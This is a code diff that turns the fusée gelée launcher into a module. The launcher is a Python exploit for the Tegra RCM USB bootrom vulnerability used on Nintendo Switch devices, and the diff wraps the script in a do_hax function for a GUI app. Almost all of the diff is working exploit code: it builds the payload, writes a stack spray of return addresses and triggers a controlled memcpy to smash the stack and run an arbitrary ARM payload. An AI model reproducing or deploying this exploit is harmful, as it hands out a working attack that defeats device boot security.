@@ -546,8 +546,8 @@ class RCMHax:
     def switch_to_highbuf(self):
         """ Switches to the higher RCM buffer, reducing the amount that needs to be copied. """
 
-        if switch.get_current_buffer_address() != self.COPY_BUFFER_ADDRESSES[1]:
-            switch.write(b'\0' * 0x1000)
+        if self.get_current_buffer_address() != self.COPY_BUFFER_ADDRESSES[1]:
+            self.write(b'\0' * 0x1000)
 
 
     def trigger_controlled_memcpy(self, length=None):
@@ -564,122 +564,130 @@ def parse_usb_id(id):
     """ Quick function to parse VID/PID arguments. """
     return int(id, 16)
 
+
+# Arguments not needed for this GUI App
+# A mock of the arguments is provided
 # Read our arguments.
-parser = argparse.ArgumentParser(description='launcher for the fusee gelee exploit (by @ktemkin)')
-parser.add_argument('payload', metavar='payload', type=str, help='ARM payload to be launched; should be linked at 0x40010000')
-parser.add_argument('-w', dest='wait', action='store_true', help='wait for an RCM connection if one isn\'t present')
-parser.add_argument('-V', metavar='vendor_id', dest='vid', type=parse_usb_id, default=None, help='overrides the TegraRCM vendor ID')
-parser.add_argument('-P', metavar='product_id', dest='pid', type=parse_usb_id, default=None, help='overrides the TegraRCM product ID')
-parser.add_argument('--override-os', metavar='platform', dest='platform', type=str, default=None, help='overrides the detected OS; for advanced users only')
-parser.add_argument('--relocator', metavar='binary', dest='relocator', type=str, default="%s/intermezzo.bin" % os.path.dirname(os.path.abspath(__file__)), help='provides the path to the intermezzo relocation stub')
-parser.add_argument('--override-checks', dest='skip_checks', action='store_true', help="don't check for a supported controller; useful if you've patched your EHCI driver")
-parser.add_argument('--allow-failed-id', dest='permissive_id', action='store_true', help="continue even if reading the device's ID fails; useful for development but not for end users")
-arguments = parser.parse_args()
-
-# Expand out the payload path to handle any user-refrences.
-payload_path = os.path.expanduser(arguments.payload)
-if not os.path.isfile(payload_path):
-    print("Invalid payload path specified!")
-    sys.exit(-1)
-
-# Find our intermezzo relocator...
-intermezzo_path = os.path.expanduser(arguments.relocator)
-if not os.path.isfile(intermezzo_path):
-    print("Could not find the intermezzo interposer. Did you build it?")
-    sys.exit(-1)
-
-# Get a connection to our device.
-try:
-    switch = RCMHax(wait_for_device=arguments.wait, vid=arguments.vid, 
-            pid=arguments.pid, os_override=arguments.platform, override_checks=arguments.skip_checks)
-except IOError as e:
-    print(e)
-    sys.exit(-1)
-
-# Print the device's ID. Note that reading the device's ID is necessary to get it into
-try:
-    device_id = switch.read_device_id()
-    print("Found a Tegra with Device ID: {}".format(device_id))
-except OSError as e:
-    # Raise the exception only if we're not being permissive about ID reads.
-    if not arguments.permissive_id:
-        raise e
+# parser = argparse.ArgumentParser(description='launcher for the fusee gelee exploit (by @ktemkin)')
+# parser.add_argument('payload', metavar='payload', type=str, help='ARM payload to be launched; should be linked at 0x40010000')
+# parser.add_argument('-w', dest='wait', action='store_true', help='wait for an RCM connection if one isn\'t present')
+# parser.add_argument('-V', metavar='vendor_id', dest='vid', type=parse_usb_id, default=None, help='overrides the TegraRCM vendor ID')
+# parser.add_argument('-P', metavar='product_id', dest='pid', type=parse_usb_id, default=None, help='overrides the TegraRCM product ID')
+# parser.add_argument('--override-os', metavar='platform', dest='platform', type=str, default=None, help='overrides the detected OS; for advanced users only')
+# parser.add_argument('--relocator', metavar='binary', dest='relocator', type=str, default="%s/intermezzo.bin" % os.path.dirname(os.path.abspath(__file__)), help='provides the path to the intermezzo relocation stub')
+# parser.add_argument('--override-checks', dest='skip_checks', action='store_true', help="don't check for a supported controller; useful if you've patched your EHCI driver")
+# parser.add_argument('--allow-failed-id', dest='permissive_id', action='store_true', help="continue even if reading the device's ID fails; useful for development but not for end users")
+# arguments = parser.parse_args()
 
 
-# Prefix the image with an RCM command, so it winds up loaded into memory
-# at the right location (0x40010000).
+def do_hax(arguments):
+    # Make a function out of the original script
+    # The objective is to be able to use fusee-launcher as module
+    
+    # Expand out the payload path to handle any user-refrences.
+    payload_path = os.path.expanduser(arguments.payload)
+    if not os.path.isfile(payload_path):
+        print("Invalid payload path specified!")
+        sys.exit(-1)
 
-# Use the maximum length accepted by RCM, so we can transmit as much payload as
-# we want; we'll take over before we get to the end.
-length  = 0x30298
-payload = length.to_bytes(4, byteorder='little')
+    # Find our intermezzo relocator...
+    intermezzo_path = os.path.expanduser(arguments.relocator)
+    if not os.path.isfile(intermezzo_path):
+        print("Could not find the intermezzo interposer. Did you build it?")
+        sys.exit(-1)
 
-# pad out to 680 so the payload starts at the right address in IRAM
-payload += b'\0' * (680 - len(payload))
+    # Get a connection to our device.
+    try:
+        switch = RCMHax(wait_for_device=arguments.wait, vid=arguments.vid, 
+                pid=arguments.pid, os_override=arguments.platform, override_checks=arguments.skip_checks)
+    except IOError as e:
+        print(e)
+        sys.exit(-1)
 
-# Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
-# We'll use this data to smash the stack when we execute the vulnerable memcpy.
-print("\nSetting ourselves up to smash the stack...")
-
-# Include the Intermezzo binary in the command stream. This is our first-stage
-# payload, and it's responsible for relocating the final payload to 0x40010000.
-intermezzo_size = 0
-with open(intermezzo_path, "rb") as f:
-    intermezzo      = f.read()
-    intermezzo_size = len(intermezzo)
-    payload        += intermezzo
+    # Print the device's ID. Note that reading the device's ID is necessary to get it into
+    try:
+        device_id = switch.read_device_id()
+        print("Found a Tegra with Device ID: {}".format(device_id))
+    except OSError as e:
+        # Raise the exception only if we're not being permissive about ID reads.
+        if not arguments.permissive_id:
+            raise e
 
 
-# Pad the payload till the start of the user payload.
-padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
-payload += (b'\0' * padding_size)
+    # Prefix the image with an RCM command, so it winds up loaded into memory
+    # at the right location (0x40010000).
 
-target_payload = b''
+    # Use the maximum length accepted by RCM, so we can transmit as much payload as
+    # we want; we'll take over before we get to the end.
+    length  = 0x30298
+    payload = length.to_bytes(4, byteorder='little')
 
-# Read the user payload into memory.
-with open(payload_path, "rb") as f:
-    target_payload = f.read()
+    # pad out to 680 so the payload starts at the right address in IRAM
+    payload += b'\0' * (680 - len(payload))
 
-# Fit a collection of the payload before the stack spray...
-padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
-payload += target_payload[:padding_size]
+    # Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
+    # We'll use this data to smash the stack when we execute the vulnerable memcpy.
+    print("\nSetting ourselves up to smash the stack...")
 
-# ... insert the stack spray...
-repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
-payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
+    # Include the Intermezzo binary in the command stream. This is our first-stage
+    # payload, and it's responsible for relocating the final payload to 0x40010000.
+    intermezzo_size = 0
+    with open(intermezzo_path, "rb") as f:
+        intermezzo      = f.read()
+        intermezzo_size = len(intermezzo)
+        payload        += intermezzo
 
-# ... and follow the stack spray with the remainder of the payload.
-payload += target_payload[padding_size:]
 
-# Pad the payload to fill a USB request exactly, so we don't send a short
-# packet and break out of the RCM loop.
-payload_length = len(payload)
-padding_size   = 0x1000 - (payload_length % 0x1000)
-payload += (b'\0' * padding_size)
+    # Pad the payload till the start of the user payload.
+    padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
+    payload += (b'\0' * padding_size)
 
-# Check to see if our payload packet will fit inside the RCM high buffer.
-# If it won't, error out.
-if len(payload) > length:
-    size_over = len(payload) - length
-    print("ERROR: Payload is too large to be submitted via RCM. ({} bytes larger than max).".format(size_over))
-    sys.exit(errno.EFBIG)
+    target_payload = b''
 
-# Send the constructed payload, which contains the command, the stack smashing
-# values, the Intermezzo relocation stub, and the final payload.
-print("Uploading payload...")
-switch.write(payload)
+    # Read the user payload into memory.
+    with open(payload_path, "rb") as f:
+        target_payload = f.read()
 
-# The RCM backend alternates between two different DMA buffers. Ensure we're
-# about to DMA into the higher one, so we have less to copy during our attack.
-switch.switch_to_highbuf()
+    # Fit a collection of the payload before the stack spray...
+    padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
+    payload += target_payload[:padding_size]
 
-# Smash the device's stack, triggering the vulnerability.
-print("Smashing the stack...")
-try:
-    switch.trigger_controlled_memcpy()
-except ValueError as e:
-    print(str(e))
-except IOError:
-    print("The USB device stopped responding-- sure smells like we've smashed its stack. :)")
-    print("Launch complete!")
+    # ... insert the stack spray...
+    repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
+    payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
+
+    # ... and follow the stack spray with the remainder of the payload.
+    payload += target_payload[padding_size:]
+
+    # Pad the payload to fill a USB request exactly, so we don't send a short
+    # packet and break out of the RCM loop.
+    payload_length = len(payload)
+    padding_size   = 0x1000 - (payload_length % 0x1000)
+    payload += (b'\0' * padding_size)
+
+    # Check to see if our payload packet will fit inside the RCM high buffer.
+    # If it won't, error out.
+    if len(payload) > length:
+        size_over = len(payload) - length
+        print("ERROR: Payload is too large to be submitted via RCM. ({} bytes larger than max).".format(size_over))
+        sys.exit(errno.EFBIG)
+
+    # Send the constructed payload, which contains the command, the stack smashing
+    # values, the Intermezzo relocation stub, and the final payload.
+    print("Uploading payload...")
+    switch.write(payload)
+
+    # The RCM backend alternates between two different DMA buffers. Ensure we're
+    # about to DMA into the higher one, so we have less to copy during our attack.
+    switch.switch_to_highbuf()
+
+    # Smash the device's stack, triggering the vulnerability.
+    print("Smashing the stack...")
+    try:
+        switch.trigger_controlled_memcpy()
+    except ValueError as e:
+        print(str(e))
+    except IOError:
+        print("The USB device stopped responding-- sure smells like we've smashed its stack. :)")
+        print("Launch complete!")
 
